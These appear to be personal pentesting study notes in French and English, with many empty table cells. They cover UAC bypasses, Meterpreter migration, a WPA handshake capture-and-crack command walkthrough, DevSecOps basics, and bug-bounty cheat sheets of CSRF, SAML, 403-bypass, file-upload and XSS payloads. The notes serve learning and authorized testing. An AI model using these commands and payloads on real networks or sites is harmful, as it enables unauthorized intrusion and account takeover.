<strong>Un administrateur local se voit ainsi attribuer au niveau du système deux jetons d'accès (access tokens). Le premier est celui qui englobe tous ses droits et ses privilèges administrateur, le second est un dérivé du premier, dit « filtré », qui contient des privilèges d'utilisateur standard. Par défaut, si UAC est activé, c'est le jeton filtré qui est utilisé, à moins qu'un programme signale qu'il doit être élevé pour fonctionner, c’est-à-dire exécuté dans un contexte administratif ( une fenêtre s’affiche ). Si l'utilisateur n'est pas administrateur, il doit en outre saisir le mot de passe d'un administrateur actif pour exécuter le programme.</strong>
</p>
<p>
<strong>Il n'est donc plus possible qu'un programme nécessitant des droits administrateurs soit lancé de “manière invisible”.</strong>
</p>
<h3>UAC bypass techniques</h3>



<table>
  <tr>
   <td><strong>Using Fodhelper utility :</strong>
<p>
<strong>When a user is requesting to open “Manage Optional Features” in Windows Settings in order to make a language change a process is created under the name fodhelper.exe.</strong>
<p>
<strong>This binary has the auto-elevate setting to “true” ( High integrety ). </strong>
<p>
<strong>It has been discovered that the “fodhelper” process when it starts tries to find some registry keys which don't exist.</strong>
<p>

<img src="images/image391.png" width="" alt="alt_text" title="image_tooltip">

<p>
<strong>Since these registry entries don't exist, a user can create this structure in the registry in order to manipulate fodhelper to execute a command with higher privileges bypassing the User Account Control (UAC).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SilentCleanup scheduled task:</strong>
<p>
<strong>This task automatically runs with elevated privileges. When the task runs, it will execute the file %windir%\system32\cleanmgr.exe. The misconfiguration is that we can control the user's environment variables i.e %windir% we can change it to execute a malicious executable.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Process migration :
</li>
</ul>
<p>
<strong>After a successful exploitation, such as, tricking a victim to execute a Meterpreter executable, gaining RCE an executing a generated Meterpreter payload ,Meterpreter process has to be migrated to:</strong>
</p>
<ul>

<li><strong>Hiding the process to gain persistence and avoid detection.</strong>

<li><strong>Change the process architecture to execute some payloads with the current architecture. For example, if there is a 64-bits system and our meterpreter process is 86-bits, some architecture-related problems could happen if we try to execute some exploits against the session gained.</strong>

<li><strong>Migrate to a more stable process.</strong>
</li>
</ul>
<ul>

<li>Misc

<li><strong>Pour les habitués des systèmes Linux, vous utilisez certainement le couple "Shell - SSH" pour administrer votre machine à distance. Sous Windows, on trouve l'équivalent "PowerShell - WinRM".</strong>
</li>
</ul>
<ol>

<li>Wifi
<h3>
Tools</h3>



<table>
  <tr>
   <td>
</li>
</ol>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>SSID

<li><strong>Le SSID (Service Set IDentifier) est tout simplement le nom d’un réseau WiFi, composé au maximum de 32 caractères alphanumériques. Il permet donc d’identifier le réseau ou le hotspot WiFi sur lequel vous pouvez vous connecter. Attention, le SSID doit toujours être accompagné d’autres mesures de sécurité, comme un protocole de chiffrement WPA, pour assurer une protection correcte des internautes surfant sur le réseau. Sinon on appelle ça un Open SSID ( sans mot de passe ).</strong>
<ul>

<li>WLAN

<li><strong>L'acronyme WLAN, pour Wireless Local Area Network, désigne un type de réseau local qui a la particularité d'être sans fil ( environ une centaine de mètres )</strong>
</li>
</ul>
</li>
</ul>
<ul>

<li>WPA PSK
</li>
</ul>
<p>

<img src="images/image392.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>WPA ou WPA2
<p>


<img src="images/image393.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>WPA-Personal vs WPA-Entreprise
<p>


<img src="images/image394.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<strong>CCMP = Il s’agit du sigle pour CBC-MAC </strong>Counter Mode<strong> Protocol.</strong>
</p>
<ul>

<li>Confidentialité : utilisation d’une variante de CTR mode : On utilise juste un compteur initialisé dès le début, non concaténé avec une nonce.

<li>CBC-MAC => pour l’authentification
<ul>

<li>WPA/WPA2 MGT
<p>


<img src="images/image395.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<img src="images/image396.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Protocole WPS
<p>

<strong>- Le but du protocole WPS est de simplifier la phase de configuration de la sécurité des réseaux sans fil. Il permet à des particuliers ayant peu de connaissances sur la sécurité de configurer un accès WPA, supporté par les appareils Wi-Fi.</strong>
</p>
<ul>

<li>AP ( Access Point )
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Access Point (AP) est un appareil permettant de nous relier au switch par ondes radio à la place de câbles :</strong>
<p>

    
<img src="images/image397.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>BSSID

<li><strong>BSSID : AP MAC Address</strong>
<ul>

<li>BSS

<li><strong>Un ensemble formé par le point d'accès (AP) et les stations situés dans sa zone de couverture est appelé ensemble de services de base (BSS).</strong>
<p>


<img src="images/image398.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
<strong>IEEE 802.11ac, appelé également Wi-Fi 5, est un standard de transmission sans fil de la famille Wi-Fi, normalisé par l'IEEE le 8 janvier 2014.</strong>
</p>
<p>
<strong>Evil twin : malicious copy of legitimate network with the same name and similar features.</strong>
</p>
<p>
<strong>WPA3 (WiFi Protected Access 3) is the latest WiFi security standard announced by WiFi Alliance in 2018. It will succeed the WPA2 standard. Simultaneous Authentication of Equals (SAE) is a new feature in WPA3 which will replace the WPA2-PSK network. SAE has multiple new security features like perfect forward secrecy, protection against passphrase bruteforce and Protected Management Frames (PMF).</strong>
</p>
<p>
<strong>Enhanced Open is a new WiFi Alliance security standard for open public networks. It is based on Opportunistic Wireless Encryption (OWE). OWE provides privacy and secrecy without authentication without the need for a commonly known secret.</strong>
</p>
<ul>

<li>Password Cracking ( WPA/WPA2 BForcing )
</li>
</ul>
<p>
Brute-forcing : majority of network devices and applications lack the resilience to effectively detect and prevent brute-force attacks, it comes as an effective attack.
</p>
<p>
Theory before practice :
</p>
<p>
Wi-Fi Handshake : A handshake in Wi-Fi is a mechanism by which an access point authenticates a client to onboard it and use its services. In this handshake, we have something called a message integrity check (MIC), which is a combination of your Wi-Fi passphrase, nonce (random numbers), SSID and some other keys. this handshake only occurs when a user authenticates.
</p>
<p>
The goal is to capture this handshake (inside a .cap file), extract juicy information and brute force against the MIC to finally obtain a password. 
</p>
<p>
Pré-requis :
</p>
<ul>

<li>1) Avoir un external Wi-Fi adapter pouvant être mis en mode “monitor”.
</li>
</ul>
<h4>Steps :</h4>


<ul>

<li>1) putting our Wi-Fi adapter in monitor mode first : 
<ul>
 
<li>airmon-ng start wlan0
</li> 
</ul>
</li> 
</ul>
<ul>

<li>2)  Find your access point target (here, SSID=raaj is the target ) : 
<ul>
 
<li>airodump-ng wlan0mon
</li> 
</ul>
</li> 
</ul>
<p>

<img src="images/image399.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>3) Capture a handshake : 
<ul>
 
<li>airodump-ng wlan0mon -c3 --bssid 18:45:93:69:A5:19 -w pwd  
<ul>
  
<li>-c : channel
  
<li>-w : name to save as
<p>

        We have to force a user to reauthenticate by deauthenticating him. It can be done by aireplay-ng like this :
</p>
<ul>

<li>aireplay-ng --deauth 0 -a 18:45:93:69:A5:19 wlan0mon
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
		Now, you have to wait until you get a Handshake :
</p>
<p>

<img src="images/image400.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>4) Bruteforcing : 
<ul>
 
<li>aircrack-ng handshake.cap -w dict.txt
<p>

        OU
</p> 
<ul>
 
<li>cowpatty -r handshake.cap -f dict.txt -s raaj
<p>

        OU
</p>
<ul>

<li>cd /usr/share/hashcat-utils
<p>

        ./cap2hccapx.bin /root/handshake.cap /root/handshake.hccapx
</p>
<p>

        hashcat -m 2500 handshake.hccapx dict.txt --show
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
		OU
</p>
<ul>

<li>hcxpcapngtool --john hash.john handshake.cap
<p>

        john --format=wpapsk --wordlist dict.txt hash.john
</p>
<p>

        john --show hash.john
</p>
</li>
</ul>
<p>
		
</p>
<p>
		It can be quite worth to try all the methods.
</p>
<ol>

<li>DevOps / DevOpsSec

<li>Définition
</li>
</ol>
<p>
<strong>DevOps is a set of practices that combines software development (Dev) and IT operations (Ops : Administration des systèmes ). It aims to provide continuous delivery with high software quality.</strong>
</p>
<p>
<strong>Understanding of DevOps processes is a must for a Pentester or DevOps professional.</strong>
</p>
<p>
<strong>DevSecOps refers to introducing security in different stages of the DevOps process.</strong>
</p>
<p>
<strong>DevOps differs from SDLC and Agile.</strong>
</p>
<h3>
Etape Dev et Ops :		
<img src="images/image401.png" width="" alt="alt_text" title="image_tooltip">
</h3>


<p>


<img src="images/image402.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<strong>All Steps have to be automatic.</strong>
</p>
<h3>
    Version Control System :</h3>


<p>

<strong>This phase deals with the writing and management of the source code. When multiple developers are working on a big project, the code from all contributors needs to be collected in one place (Code Repository) before the build phase.</strong>
</p>
<h3>
    Testing :</h3>


<p>

<strong>Testing is done by the developers to make sure that the software/app is working fine. In this phase, we are focusing on the automated tests written by the developers that can be run automatically after each build.</strong>
</p>
<p>

<strong>Exemples de framework de test automatique : JUnit, Pytest, Tox, Selenium ( pour interagir avec les navigateurs )</strong>
</p>
<p>

<strong>    </strong>
</p>
<h3>
    Intégration Continue :</h3>


<p>

<strong>L’intégration continue est un ensemble de pratiques consistant à tester de manière automatisée chaque révision de code avant de le déployer en production. </strong>
</p>
<p>

<strong>Lorsque le développeur code une fonctionnalité, il conçoit également le test associé et ajoute le tout à son dépôt de code. Le serveur d’intégration va ensuite faire tourner tous les tests pour vérifier qu’aucune régression n’a été introduite dans le code source suite à cet ajout. Si un problème est identifié, le déploiement n’a pas lieu et les Dev sont notifiés. Si aucune erreur n’est remontée, le serveur d’intégration peut déployer directement le code en production.  </strong>
</p>
<p>

<strong>Ainsi, avec l’intégration continue la phase de tests automatisés est complètement intégrée au flux de déploiement. </strong>
</p>
<p>


<img src="images/image403.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<strong>Exemple de tools : Jenkins, Gitlab CI, Travis CI, TeamCity, GoCD</strong>
</p>
<p>

<strong>In the case of DevSecops, the CI  server triggers the security tools in different phases (e.g. Static Code Analysis, Dynamic Analysis, etc) and stores the logs/reports.  </strong>
</p>
<h3>
    Infrastructure as Code</h3>


<p>

<strong>Infrastructure as Code (IaC) dictates that the infrastructure needed to deploy (or test deploy) the application (e.g. application server, dependencies, WAF, database server, etc.), should be defined in a file/script that can be executed to make the infrastructure ready. It covers the tools/techniques used to automate the creation of setup for deployment (or test deployment) of the project. </strong>
</p>
<p>

<strong>Exemple de tool : Ansible</strong>
</p>
<p>

<strong>Why is “Infrastructure as Code” important in DevSecOps? </strong>
</p>
<p>

<strong>Infrastructure as Code saves the repetitive human effort in setting up and managing the infrastructure. It also removes the human error altogether (i.e. once the script is finalized) by making sure that everything is set up, in the same way, every time the script is run. It also ensures that the developers and testers are working on an accurate setup with no special settings/misconfiguration etc caused by the operations team.  </strong>
</p>
<ol>

<li>Audit en boîte blanche
<h3>
Code Review : Strategies :</h3>


<ul>

<li><strong>1) Read Everything ( function by function ) directly :</strong> 
<ul>
 
<li><strong>Very time consuming (Almost impossible if the code is too large)</strong>
 
<li><strong>Very good way when you are apart of an internal team and you aren’t just looking for vulnerabilities but also for weaknesses that can be fixed to increase the security. </strong>
 
<li><strong>But the coverage of the review the code is perfect</strong>
<p>

<p style="text-align: right">

<img src="images/image404.png" width="" alt="alt_text" title="image_tooltip">
</p>

</p>
<ul>

<li><strong>2) Function to called function ( TOP to the BOTTOM ) :</strong> 
<ul>
 
<li><strong>By picking up a function (ideally directly accessible form an user) and reviewing every function that is called and doing the same process for the called functions.</strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ol>
<p>

<img src="images/image405.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Only Searching for expressions or dangerous functions isn’t a good way to make a code review because :</strong> 
<ul>
 
<li><strong>Maybe the function in question is never accessed by any user input.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>3) Functionally by Functionally  :</strong> 
<ul>
 
<li><strong>Picking a functionality and reviewing the code that is linked with.</strong>
</li> 
</ul>
</li> 
</ul>
<p>

<img src="images/image406.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>
Code Review : Reviewing :</h3>


<ul>

<li>Méthode 1 
<ul>
 
<li>Function context :
</li> 
</ul>
</li> 
</ul>
<p>

<img src="images/image407.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li>Bug bounty Tips
<ul>

<li>BB - Recon (file, url, subdomains):

<li><strong>For wordlist</strong> : https://wordlists.assetnote.io/

<table>
  <tr>
   <td>
<ul>

<li><strong>Using grep to extract URLs in HTTP response : curl -i [URL] | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*</strong>”
</li>
</ul>
</li>
</ul>
</li>
</ol>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>cd /home/kali/prog/lib/GRecon/ ; python3 grecon.py :</strong> 
<ul>
 
<li><strong>GRecon_Cli tool using Google Dork to find : </strong>  
<ul>
  
<li><strong>Sub-Subdomains</strong>
  
<li><strong>Signup/Login pages</strong>
  
<li><strong>Dir Listing</strong>
  
<li><strong>Exposed Docs ( pdf, xls, docx … )</strong>
  
<li><strong>WordPress Entries</strong>
  
<li><strong>Pasting Sites ( Records in pastebin, Ghostbin… )</strong>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Grawler - v1.0 : Grawler is the best tool ever, made for automating google dorks (https://github.com/A3h1nt/Grawler)</strong>
    <strong>This is a website tool.</strong>
<p>

    <strong>Run with php -S localhost:8000 in the website folder ( tool folder ).</strong>
<ul>

<li>Fast Google Dorks Scan :

<p>
       
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>JavaScript recon automation :</strong> 
<ul>
 
<li><strong>Gather JSFile links from the target</strong>
 
<li><strong>Finding Endpoints From the JSFiles</strong>
 
<li><strong>Finding Secrets in the JSFiles</strong>
 
<li><strong>Get JSFiles locally for manual analysis</strong>
 
<li><strong>tools :</strong>  
<ul>
  
<li><strong>JSParser : parse relative URLs from JavaScript files</strong>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Github</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - CSRF Bypass protection :

<table>
  <tr>
   <td>
<ul>

<li><strong>Using a CSRF token across accounts</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Replacing value of same length : </strong>for instance it is an alphanumeric token of 32 characters under the variable authenticity_token you replace the same variable some other 32 character value
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Removing the CSRF token from requests entirely ( or just the value of the parameter )</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Decoding CSRF tokens then identifying how it’s made and trying to modify it.</strong>
    Most of the time, CSRF tokens are either MD5 or Base64 encoded values.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Extracting token via HTML injection ( Dangling ... )</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Using only the static parts of the token if it’s made with a static part.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Clickjacking</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Change the request method</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>If the double-submit token cookie is used as the defense mechanism : 
<ul>
 
<li><strong>session fixation technique => Then, execute the CSRF with the same CSRF token that you fix as the cookie.</strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>For CSRF Protection via Referer : 
<ul>
 
<li><strong>You can add the following meta tag to the page hosting your payload to Remove the referer header.</strong> 
<ul>
 
<li><strong>You can try bypassing the verification of the header by including authorized terms in the URL CSRF payload.</strong> 
<ul>
 
<li><strong>Utiliser la fonction history.pushState() dans le payloads pour modifier l’en-tête Referer.</strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Check if there is a CSRF token</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>CSRF JSON Data :</strong> 
<ul>
 
<li><strong>Check if we change the Content-type to text/plain there is no error. Then, construct the CSRF.</strong> 
<ul>
 
<li><strong>Check if we change the Content-type to application/x-www-form-urlencoded there is no error. Then, construct the CSRF.</strong>
<ul>

<li><strong>Check if we change the Content-type to multipart/form-data there is no error. Then, construct the CSRF.</strong>
<ul>

<li><strong>Rajouter à la fin de l’url .json</strong>
<strong>https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>
BB - OAuth :

<table>
  <tr>
   <td>
<ul>

<li><strong>Test CSRF for Linking external Account</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Test CSRF into Open redirect for retrieving the victim’s token ( or code )</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>1) CSRF-Login in the Authorisation Server</strong>

<li><strong>2) CSRF-Linking with the victim account and your AS account ( Authorization Server )</strong>
    <strong>3) Log in with your AS Account to take over the victim’s account.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - SAML  :

<table>
  <tr>
   <td>
<ul>

<li><strong>Comment injection in XML document in the mail address for login</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Signature Stripping</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Change the login of a user ( in the SAMLResponse )</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Try to use the default secret key provided by the library used.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - Bypassing 403 and 401 error :

<li>

<table>
  <tr>
   <td>
<ul>

<li><strong>Use byp4xx script to automate the attack</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Changing HTTP verbs</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Plugin on Burp suite : 403Bypasser  =>  automates bypassing of 403 Forbidden errors.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>target.com/admin..;/</strong>

<li><strong>target.com/../admin</strong>

<li><strong>target.com/whatever/..;/admin</strong>

<li><strong>target.com/admin/</strong>

<li><strong>target.com/admin/.</strong>

<li><strong>target.com//admin//</strong>

<li><strong>target.com/./admin/..</strong>

<li><strong>target.com//admin/*</strong>

<li><strong>http://site.com/secret => 200 OK ( http sans le S )</strong>

<li><strong>site.com/%2f/secret.txt/</strong>

<li><strong>target.com/admin%20/</strong>

<li><strong>target.com/%20admin%20/</strong>

<li><strong>target.com/admin%20/page</strong>

<li><strong>/.;/admin</strong>

<li><strong>/admin;/</strong>

<li><strong>/admin/~</strong>

<li><strong>/admin?param</strong>

<li><strong>/%2e/admin</strong>

<li><strong>/admin#</strong>

<li><strong>by deeper traversing :</strong> 
<ul>
 
<li><strong>/.git => 403</strong>
 
<li><strong>/.git/config => 200 OK</strong>
</li> 
</ul>

<li><strong>Headers to Rewrite URLs :</strong> 
<ul>
 
<li><strong>X-Original-URL: /admin OR localhost</strong>
 
<li><strong>X-Override-URL: /admin</strong>
 
<li><strong>X-Rewrite-URL: /admin</strong>
 
<li><strong>X-Originating-IP: /admin</strong>
 
<li><strong>X-Remote-IP: /admin</strong>
 
<li><strong>X-Client-IP: /admin</strong>
 
<li><strong>X-Forwarded-For: /admin</strong>
 
<li><strong>...</strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Try inserting unicode characters to bypass the defenses</strong> 
<ul>
 
<li><strong>Example : ℀ = ca, ℁ = sa</strong>
        <strong>So if /cadmin is blocked, try accessing ℀dmin.</strong>

<p>
<strong>You can find example on this site : <a href="https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names">https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names</a></strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Referrer: target.com/admin</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB : File upload :

<table>
  <tr>
   <td>
<ul>

<li>Alternative to classic extensions :
<ul>

<li>PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
<ul>

<li>ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
<ul>

<li>Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
<ul>

<li>Coldfusion: .cfm, .cfml, .cfc, .dbm
<ul>

<li>Flash: .swf
<ul>

<li>Perl: .pl, .cgi
<ul>

<li>Erlang Yaws Web Server: .yaws
<ul>

<li>using some uppercase letters: pHp, .pHP5, .PhAr ...
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Bypass file extensions checks 
<ul>
 
<li>1) Adding a valid extension before the execution extension   
<ul>
  
<li>file.png.php
  
<li>file.png.Php5
<ul>

<li>2) Try adding special characters at the end ( with a wordlist; bruteforce with Burp ). 
<ul>
 
<li>file.php%20
 
<li>file.php%0a
 
<li>file.php%00
 
<li>file.php%0d%0a
 
<li>file.php/
 
<li>file.php.\
 
<li>file.
 
<li>file.php....
 
<li>file.pHp5....
<ul>

<li>file.php%00.png

<li>file.php\x00.png

<li>file.php%0a.png

<li>file.php%0d%0a.png

<li>file.phpJunk123png

<li>file.png.jpg.php

<li>file.php%00.png%00.jpg
<ul>

<li>3) Try to put the exec extension before the valid extension and pray so the server is misconfigured : 
<ul>
 
<li>ex: file.php.png
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Turning LFI to RCE in PHP using ZIP wrapper
Condition :
<ul>

<li>For PHP based websites.

<li>We can upload zip files.

<li>LFI (Local File Inclusion) vulnerability present in the server
<p>


<img src="images/image408.png" width="" alt="alt_text" title="image_tooltip">

<p>

Using this trick ( zip ) we have basically circumvented the file upload restrictions of the web application disallowing us to upload a php file directly.
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB : Broken access control :

<table>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - XSS  :

<li>

<table>
  <tr>
   <td>
<ul>

<li><strong>Payload in XML file :</strong>
    
<img src="images/image409.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>XSS recon :</strong> 
<ul>
 
<li><strong>xss_check [URL] ( without “https://” )</strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Polyglot payload ( depending on the situation,adapt it and do not copy & paste blindly ) :</strong> 
<ul>
 
<li><strong>-->'"/>&lt;/sCript>&lt;deTailS open x=">" ontoggle=(co\u006efirm)``></strong>
 
<li><strong>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!>\x3csVg/&lt;sVg/oNloAd=alert()//>\x3e</strong> 
<ul>
 
<li><strong>jaVasCript:/*-->&lt;/title>&lt;/style>&lt;/textarea>&lt;/script>&lt;/xmp>&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'></strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>DOM-XSS scanner online :</strong> 
<ul>
 
<li><strong>https://domxssscanner.geeksta.net/scan?</strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>XSS firewall bypass techniques</strong> 
<ul>
 
<li><strong>lower/uppercase : &lt;sCRipT>alert(1)&lt;/sCRiPt></strong>
 
<li><strong>CRLF injection : &lt;script>%0d%0aalert(1)&lt;/script></strong>
 
<li><strong>Double encoding : %2522</strong>
 
<li><strong>Testing for recursive filters : &lt;scr&lt;script>ipt>alert(1);&lt;/scr&lt;/script>ipt></strong>
 
<li><strong>Injecting anchor tag without whitespaces : &lt;a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;"></strong>
 
<li><strong>Try to bypass whitespaces using a bullet : &lt;svg•onload=alert(1)></strong>
 
<li><strong>Try to change request method</strong>
 
<li><strong>Add any number of \n, \t or \r : java\nscript</strong>
 
<li><strong>Add characters from \x00-\x20 at the beginning : \x01javascript</strong>
 
<li><strong>Variation of alert() : write(1) , confirm(1), prompt(1)</strong>
 
<li><strong>payload without parenthesis : </strong>
